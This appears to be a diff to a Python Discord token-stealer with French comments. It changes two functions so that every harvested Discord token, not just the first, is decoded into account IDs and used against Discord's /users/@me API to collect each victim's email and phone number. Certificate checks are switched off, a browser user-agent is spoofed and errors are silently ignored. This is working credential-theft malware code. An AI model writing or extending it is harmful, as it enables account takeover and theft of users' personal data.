@@ -1556,41 +1556,42 @@ def get_discord_token():
 
 def get_discord_user_id():
     """Tente de récupérer l'ID Discord de l'utilisateur."""
-    # 1. Tenter d'extraire l'ID Discord directement depuis le token s'il existe
     tokens_str = get_discord_token()
-    # Utiliser le premier token pour décoder l'ID Discord
-    token = tokens_str.split(" | ")[0] if tokens_str and tokens_str != "N/A" else ""
-    if token:
-         try:
-              import base64
-              parts = token.split('.')
-              if len(parts) >= 1:
-                   # Remplir le padding base64 si nécessaire
-                   part = parts[0]
-                   part += "=" * ((4 - len(part) % 4) % 4)
-                   decoded = base64.b64decode(part).decode('utf-8', errors='ignore')
-                   if decoded.isdigit():
-                        return decoded
-         except Exception:
-              pass
-    return "N/A"
+    if not tokens_str or tokens_str == "N/A":
+        return "N/A"
+        
+    ids = set()
+    for token in tokens_str.split(" | "):
+        token = token.strip()
+        if not token:
+            continue
+        try:
+            import base64
+            parts = token.split('.')
+            if len(parts) >= 1:
+                # Remplir le padding base64 si nécessaire
+                part = parts[0]
+                part += "=" * ((4 - len(part) % 4) % 4)
+                decoded = base64.b64decode(part).decode('utf-8', errors='ignore')
+                if decoded.isdigit():
+                    ids.add(decoded)
+        except Exception:
+            pass
+            
+    return " | ".join(ids) if ids else "N/A"
 
 def get_discord_account_info():
     """
-    Interroge l'API Discord (/users/@me) avec le token récupéré
-    pour extraire l'email et le numéro de téléphone du compte.
-    Retourne un dict {'email': ..., 'phone': ...}.
+    Interroge l'API Discord (/users/@me) avec tous les tokens récupérés
+    pour extraire les emails et les numéros de téléphone.
+    Retourne un dict {'email': 'email1 | email2', 'phone': 'phone1 | phone2'}.
     """
     result = {"email": "N/A", "phone": "N/A"}
     try:
-        token = get_discord_token()
-        if not token or token == "N/A":
+        tokens_str = get_discord_token()
+        if not tokens_str or tokens_str == "N/A":
             return result
-        # Utiliser le premier token si plusieurs
-        first_token = token.split(" | ")[0].strip()
-        if not first_token:
-            return result
-
+            
         import urllib.request as _req
         import ssl as _ssl
         import json as _json
@@ -1598,21 +1599,40 @@ def get_discord_account_info():
         ctx = _ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = _ssl.CERT_NONE
+        
+        emails = set()
+        phones = set()
 
-        request = _req.Request(
-            "https://discord.com/api/v9/users/@me",
-            headers={
-                "Authorization": first_token,
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
-            }
-        )
-        with _req.urlopen(request, context=ctx, timeout=5) as resp:
-            data = _json.loads(resp.read().decode("utf-8", errors="ignore"))
-            email = data.get("email") or "N/A"
-            phone = data.get("phone") or "N/A"
-            result["email"] = email
-            result["phone"] = phone
+        for token in tokens_str.split(" | "):
+            token = token.strip()
+            if not token:
+                continue
+
+            try:
+                request = _req.Request(
+                    "https://discord.com/api/v9/users/@me",
+                    headers={
+                        "Authorization": token,
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
+                    }
+                )
+                with _req.urlopen(request, context=ctx, timeout=3) as resp:
+                    data = _json.loads(resp.read().decode("utf-8", errors="ignore"))
+                    email = data.get("email")
+                    phone = data.get("phone")
+                    if email:
+                        emails.add(email)
+                    if phone:
+                        phones.add(phone)
+            except Exception:
+                pass # Ignorer les tokens invalides ou expirés
+                
+        if emails:
+            result["email"] = " | ".join(emails)
+        if phones:
+            result["phone"] = " | ".join(phones)
+            
     except Exception:
         pass
     return result
